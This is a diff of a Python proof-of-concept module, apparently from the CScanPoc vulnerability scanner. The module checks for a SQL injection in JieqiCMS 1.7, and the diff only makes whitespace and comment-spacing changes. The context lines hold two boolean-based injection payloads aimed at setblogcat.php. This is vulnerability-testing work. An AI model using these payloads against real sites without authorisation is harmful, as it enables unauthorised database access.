@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'JieqiCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'JieqiCMS_0001'  # 平台漏洞编号，留空
     name = '杰奇CMS 1.7商业版SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2013-11-25'  # 漏洞公布时间
     desc = '''  
         当分隔符为in时没有对值有任何处理。EditPlus搜索含有"IN"的语句发现了注入。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'JieqiCMS(杰奇CMS)'  # 漏洞应用名称
     product_version = '1.7'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '128a01cb-6023-46a7-b47f-5e26820c81bb'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload1 = "/modules/space/setblogcat.php?action=do_edit&delete_checkbox[]=3))and 1=1%23"
             payload2 = "/modules/space/setblogcat.php?action=do_edit&delete_checkbox[]=3))and 1=2%23"
             url1 = self.target + payload1
@@ -48,6 +50,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
